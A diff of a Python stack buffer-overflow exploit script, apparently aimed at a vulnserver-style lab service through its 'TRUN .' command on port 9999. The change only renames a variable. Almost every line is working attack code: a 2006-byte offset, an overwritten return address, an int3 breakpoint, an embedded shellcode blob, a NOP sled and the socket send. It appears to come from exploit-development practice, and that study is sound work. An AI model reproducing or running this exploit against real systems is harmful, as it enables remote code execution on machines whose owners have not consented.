@@ -7,14 +7,14 @@ port = 9999
 
 sock.connect((host, port))
 
-testBuffer = b"A" * 2006
-# testBuffer += b"B" * 4
-# testBuffer += b"C" * (3000 - (2006 + 4))
+buff = b"A" * 2006
+# buff += b"B" * 4
+# buff += b"C" * (3000 - (2006 + 4))
 
 stackAddress = "0x396F4338"
-testBuffer += b"\x38\x43\x6F\x39"
+buff += b"\x38\x43\x6F\x39"
 
-testBuffer += b"\xcc"
+buff += b"\xcc"
 
 payloadBuffer = (
         b"\xFC\xE8\x82\x00\x00\x00\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B" +
@@ -40,12 +40,12 @@ payloadBuffer = (
         b"\x13\x72\x6F\x6A\x00\x53\xFF\xD5"
 )
 
-testBuffer += payloadBuffer
+buff += payloadBuffer
 
-testBuffer += b"\x90"*20
+buff += b"\x90"*20
 
-testBuffer += b"C"*(3000-(2006 + 4 + 1 + len(payloadBuffer)))
+buff += b"C"*(3000-(2006 + 4 + 1 + len(payloadBuffer)))
 
-sock.send((b"TRUN ." + testBuffer + b"\r\n"))
+sock.send((b"TRUN ." + buff + b"\r\n"))
 
 # sock.close()
